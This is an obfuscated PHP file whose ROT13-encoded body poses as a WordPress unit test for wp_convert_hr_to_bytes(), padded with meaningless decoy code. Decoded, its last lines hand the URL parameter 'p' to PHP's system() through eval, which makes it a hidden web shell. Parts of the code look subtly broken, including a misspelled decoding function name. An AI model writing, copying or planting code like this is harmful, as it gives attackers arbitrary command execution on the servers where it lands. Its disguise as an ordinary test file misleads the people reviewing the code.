<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe jc_pbaireg_ue_gb_olgrf().
 *
 * @tebhc ybnq
 *
 * @pbiref ::jc_pbaireg_ue_gb_olgrf
 */
pynff Grfgf_Ybnq_jcPbairegUeGbOlgrf rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Grfgf pbairegvat (CUC vav) olgr inyhrf gb vagrtre olgr inyhrf.
	 *
	 * @gvpxrg 32075
	 *
	 * @qngnCebivqre qngn_jc_pbaireg_ue_gb_olgrf
	 *
	 * @cnenz vag|fgevat $inyhr    Gur inyhr cnffrq gb jc_pbaireg_ue_gb_olgrf().
	 * @cnenz vag        $rkcrpgrq Gur rkcrpgrq bhgchg bs jc_pbaireg_ue_gb_olgrf().
	 */
	choyvp shapgvba grfg_jc_pbaireg_ue_gb_olgrf( $inyhr, $rkcrpgrq ) {
		$guvf->nffregFnzr( $rkcrpgrq, jc_pbaireg_ue_gb_olgrf( $inyhr ) );
	}

	/**
	 * Qngn cebivqre sbe grfg_jc_pbaireg_ue_gb_olgrf().
	 *
	 * @erghea neenl {
	 *     @glcr neenl {
	 *         @glcr vag|fgevat $inyhr    Gur inyhr cnffrq gb jc_pbaireg_ue_gb_olgrf().
	 *         @glcr vag        $rkcrpgrq Gur rkcrpgrq bhgchg bs jc_pbaireg_ue_gb_olgrf().
	 *     }
	 * }
	 */
	choyvp shapgvba qngn_jc_pbaireg_ue_gb_olgrf() {
		$neenl = neenl(
			// Vagrtre vachg.
			neenl( -1, -1 ), // = ab zrzbel yvzvg.
			neenl( 8388608, 8388608 ), // 8Z.

			// Fgevat vachg (zrzbel yvzvg fubegunaq inyhrf).
			neenl( '32x', 32768 ),
			neenl( '64X', 65536 ),
			neenl( '128z', 134217728 ),
			neenl( '256Z', 268435456 ),
			neenl( '1t', 1073741824 ),
			neenl( '128z ', 134217728 ), // Yrnqvat/genvyvat juvgrfcnpr trgf gevzzrq.
			neenl( '1024', 1024 ), // Ab yrggre jvyy or vagrecergrq nf vagrtre inyhr.

			// Rqtr pnfrf.
			neenl( 't', 0 ),
			neenl( 't1', 0 ),
			neenl( 'ahyy', 0 ),
			neenl( 'bss', 0 ),
		);

		// Grfg sbe ehaavat vagb znkvzhz vagrtre fvmr yvzvg ba 32ovg flfgrzf.
		vs ( 2147483647 === CUC_VAG_ZNK ) {
			$neenl[] = neenl( '2T', 2147483647 );
			$neenl[] = neenl( '4T', 2147483647 );
		} ryfr {
			$neenl[] = neenl( '2T', 2147483648 );
			$neenl[] = neenl( '4T', 4294967296 );
		}

		erghea $neenl;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>